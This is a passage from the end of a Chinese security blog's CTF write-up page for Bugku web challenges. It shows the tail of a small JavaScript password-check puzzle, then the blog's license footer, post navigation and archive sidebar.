class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span>));</span><br><span class="line">	<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span></span><br><span class="line"></span><br><span class="line">	h = window.prompt(<span class="string">'Enter password'</span>);</span><br><span class="line">	alert( dechiffre(h) );</span><br></pre></td></tr></table></figure>
    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>原文作者：<a href="https://wywwzjj.top">wywwzjj</a>
            </p><p>原文链接：<a href="https://wywwzjj.top/2018/09/26/Bugku_Web_WP/">https://wywwzjj.top/2018/09/26/Bugku_Web_WP/</a>
            </p><p>发表日期：<a href="https://wywwzjj.top/2018/09/26/Bugku_Web_WP/">September 26th 2018, 5:58:44 pm</a>
            </p><p>更新日期：<a href="https://wywwzjj.top/2018/09/26/Bugku_Web_WP/">April 4th 2019, 6:29:41 pm</a>
            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href="/2018/10/23/Raccoon_Writeup/" title="Raccoon web Writeup">
                    <div class="nextTitle">Raccoon web Writeup</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href="/2018/01/26/葵花宝典/" title="葵花宝典">
                    <div class="prevTitle">葵花宝典</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

<!-- City版安装代码已完成 -->
    
    
    <!-- partial('_partial/comment/changyan') -->
    <!--PC版-->


    
    

    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:wywwzjj@gmail.com" class="iconfont-archer email" title="email"></a>
            
        
    
        
            
                <a href="//github.com/wywwzjj" class="iconfont-archer github" target="_blank" title="github"></a>
            
        
    
        
            
                <span class="iconfont-archer wechat" title="wechat">
                  
                  <img class="profile-qr" src="/assets/example_qr.png">
                </span>
            
        
    
        
            
                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
    <div class="busuanzi-container">
        
        
        <span id="busuanzi_container_site_pv" class="theme-info">
            |&nbsp;&nbsp;总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>&nbsp;&nbsp;次
        </span>
        <span id="busuanzi_container_site_uv" class="theme-info">
            &nbsp;&nbsp;|&nbsp;&nbsp;访客数&nbsp;<span id="busuanzi_value_site_uv"></span>&nbsp;&nbsp;人次&nbsp;&nbsp;|
        </span>
        <!-- <span id="busuanzi_container_site_pv">阅读次数: <span id="busuanzi_value_site_pv"></span> : )</span> -->
        
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style=
    







top:50vh;

    >
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- 在ejs中将archive按照时间排序 -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 26
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 2019 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/07</span><a class="archive-post-title" href="/2019/04/07/vulnhub-靶机实战系列-HackInOS/">vulnhub 靶机实战系列-HackInOS</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/04</span><a class="archive-post-title" href="/2019/04/04/Leetcode-322-Coin-Change/">Leetcode 322.Coin Change[DP]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/2018-RCTF-Writeup/">2018-RCTF-Web-Writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/无字母数字-webshell/">无字母数字 webshell</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/2019-TCTF-Writeup/">2019_TCTF_Writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/Hackme-Writeup/">Hackme-Web-Writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQLMAP_tamper列表/">sqlmap tamper 列表</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/26</span><a class="archive-post-title" href="/2019/02/26/Jarvis_OJ_inject/">Jarvis OJ inject</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/25</span><a class="archive-post-title" href="/2019/02/25/Jarvis_OJ_phpinfo/">Jarvis OJ phpinfo</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/02</span><a class="archive-post-title" href="/2019/02/02/Jarvis-OJ-Writeup/">Jarvis OJ Writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯_一月-web/">安恒杯 一月 web</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019_Fireshell_Web_Vice/">2019 fireshell web Vice</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/POJ_2352_Stars_树状数组/">POJ-2352-Stars[树状数组]</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2018 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/2017_NJCTF_Guess/">2017 NJCTF web guess</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/22</span><a class="archive-post-title" href="/2018/12/22/优雅实现哈夫曼编码/">优雅实现哈夫曼编码</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/08</span><a class="archive-post-title" href="/2018/12/08/Please_don't_stop_rua_233333/">Please don't stop rua 233333</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/30</span><a class="archive-post-title" href="/2018/11/30/Docker_常用命令/">Docker-常用命令清单</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/23</span><a class="archive-post-title" href="/2018/11/23/漏洞练习平台及工具/">漏洞练习平台及工具</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/ACM_常用Trick/">ACM 常用小 Trick</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ_3984_迷宫问题_BFS/">POJ-3984-迷宫问题[BFS]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ_1321_棋盘问题_DFS/">POJ-1321-棋盘问题[DFS]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/23</span><a class="archive-post-title" href="/2018/10/23/Raccoon_Writeup/">Raccoon web Writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/2018/09/26/Bugku_Web_WP/">Bugku Web 部分WP</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/26</span><a class="archive-post-title" href="/2018/01/26/葵花宝典/">葵花宝典</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/26</span><a class="archive-post-title" href="/2018/01/26/Web安全笔记/">Web 安全笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/25</span><a class="archive-post-title" href="/2018/01/25/Hello_World/">Hello World</a>
        </li>
    
    </ul></div>
  </div>
        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
    
        <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
    
        <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
    
        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
    
        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
    
        <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
    
        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
    
        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
    
        <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
    
        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
    
        <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
    
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
    缺失模块。<br>
    1、请确保node版本大于6.2<br>
    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
    3、在根目录_config.yml里添加配置：
    <pre style="color: #787878; font-size: 0.6rem;">
jsonContent:
  meta: false
  pages: false
  posts:
    title: true
    date: true
    path: true
    text: false
    raw: false
    content: false
    slug: false
    updated: false
    comments: false
    link: false
    permalink: false
    excerpt: false
    categories: true
    tags: true</pre>
    </div> 
    <div class="sidebar-tags-list"></div>
</div>
        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>
    </div>
</div> 
    <script>
    var siteMeta = {
        root: "/",
        author: "wywwzjj"
    }
</script>
    <!-- CDN failover -->
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ === 'undefined')
        {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
        }
    </script>
    <script src="/scripts/main.js"></script>
    <!-- algolia -->
    
    <!-- busuanzi  -->
    
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
    <!-- CNZZ  -->
    
    </div>
    <!-- async load share.js -->
    
        <script src="/scripts/share.js" async></script>    
     
    </body>
</html>


